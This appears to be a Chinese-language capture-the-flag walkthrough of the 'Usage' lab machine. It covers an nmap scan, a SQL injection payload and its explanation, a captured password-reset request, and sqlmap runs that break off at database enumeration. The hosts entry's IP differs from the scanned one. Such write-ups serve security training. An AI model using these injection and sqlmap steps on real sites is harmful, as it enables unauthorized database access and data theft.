## Usage

```
[*]$ nmap -sC -sV 10.129.146.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 04:46 CDT
Nmap scan report for 10.129.146.187
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[★]$ echo '10.192.146.187 usage.htb' | sudo tee -a /etc/hosts
10.192.146.187 usage.htb
```
#### 访问网站
![深邃的夜空有看不见的星星](images/091401.png)
#### 点击了Admin,输入了admin/admin:
![深邃的夜空有看不见的星星](images/091402.png)
#### 返回来，点击了Registe注册：
![深邃的夜空有看不见的星星](images/091403.png)
#### 梅开二度，再返回来，点击Reset Password ->输入注册时的邮箱
![深邃的夜空有看不见的星星](images/091404.png)
#### 输对了，还得继续输入邮箱，尝试一个无效的电子邮件显示：
![深邃的夜空有看不见的星星](images/091405.png)
```
test' or 1=1;-- -
```
#### 是典型的 SQL 注入 (SQL Injection) payload 示例。它的含义是：
```
![深邃的夜空有看不见的星星](images/091406.png)
test'：提前闭合了原本的字符串。
or 1=1：构造了一个总是为真的条件。
;-- -：; 结束原来的 SQL 语句，-- - 是 SQL 中的注释符号，把后面的内容全部注释掉。
```
#### 例如，如果后台原来的查询语句是：
```
SELECT * FROM users WHERE username = 'test' AND password = '123';
```
#### 被你输入这个 payload 之后，拼接后会变成：
```
SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
```
#### 因为 OR 1=1 永远为真，这样可能导致数据库返回所有用户的信息。
### burpsuite本地拦截正确的邮箱，这很重要！
```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://usage.htb/forget-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://usage.htb
DNT: 1
Connection: keep-alive
Cookie: XSRF-TOKEN=eyJpdiI6Iks1aE9CcnpZWjN6bDA0Z1B2U2ZDNFE9PSIsInZhbHVlIjoiUWRnVUVmNVU2OUVIVXhnN2RYNlBlS1FNT0JRTE83V3g3SmtBMWVvdWFtc1g4YXBjYVVxaW45YWhWa0dxZ01Ra3N3TEpqU2JKUEtTUkVsUnJzeUxzeGEvMGxxRzNnb1g2dHE4blhYUjNiVHZuS2JYT3o0djducFFGaXRvdlpnMUYiLCJtYWMiOiJmZWNlNTU4NjMxYjVlNWU3NzlkZjQ0MzEzODRkNWMwYzNlNDY2MDAwZWQ5MmQ0MzZkYjU4MzcwMjdjZWExMTQwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlpKYkZkNjVnZ0lqekoyaFpRR0xyOWc9PSIsInZhbHVlIjoiNEtnL3U0eVdrSEtvZ3JvYnJnWCtnSnl5V1hZNlRQYy82OE5sMlAxazVnM0U4MkhlUGx6MXcwck9ockV1akRmKzFNSi9KSHdMN1BxSSt0YmVSd3dPQ3kzUlRZalp2WExNeE1UN0R1WlBVRFN1dndvTVdPTWpPcVRhdnkwTElnankiLCJtYWMiOiI2ZDJjMzFkYTgxNzQxMTgxZDY3ZGNjYzJmNWUzMDk2M2MzYjFlYzU0OGRjOWFhZjA3OWY0NDU1NDlkZjRhOTkxIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

_token=COBOwWaz4f0a8vbIrzlLl8uhRM71Cknno2xg2PsF&email=syareya%40usage.htb
```
#### 我们复制POST请求并将其保存在一个名为reset.req，我们现在可以将其提供给sqlmap
#### 在burpsuite复制的按键Ctrl+C
#### 粘贴到vi里面的按键Shift+Ctrl+V
```
[★]$ sqlmap -r reset.req email --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
<SNIP>
[11:17:47] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[11:17:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:17:47] [WARNING] POST parameter 'email' does not seem to be injectable
[11:17:47] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[11:17:47] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 25 times, 503 (Service Unavailable) - 11 times
[11:17:47] [WARNING] your sqlmap version is outdated

[*] ending @ 11:17:47 /2025-09-14/

```
#### 我们通过-r指定请求文件，通过-p指定email参数，并使用——batch来使用默认值选项，当工具提示时。然而，我们看到我们得到了许多500和503的响应，并且sqlmap没有标识注入方法。该工具本身建议使用更高的级别和/或风险，因此我们尝试设置更高的级别来尝试更大范围的测试，因为我们知道参数是脆弱的
```
[★]$ sqlmap -r reset.req -p email --batch --level 3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[11:18:46] [INFO] testing for SQL injection on POST parameter 'email'
[11:18:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:18:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:18:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[11:18:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[11:18:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[11:18:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[11:18:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[11:18:54] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[11:18:55] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[11:18:56] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:18:58] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[11:18:58] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[11:18:58] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[11:18:58] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[11:18:58] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[11:18:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[11:18:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[11:18:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[11:18:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
<SNIP>
```
#### 使用——level 3，该工具发现服务器容易受到基于布尔的盲注入的攻击，以及攻击基于时间的盲注入。我们了解到后端正在运行MySQL，现在可以继续列举数据库和表。
#### 使用——dbs标志获得可用数据库的列表：

#### 看到一个非默认数据库，即usage_blog。我们继续枚举它的表，使用——tables标志:
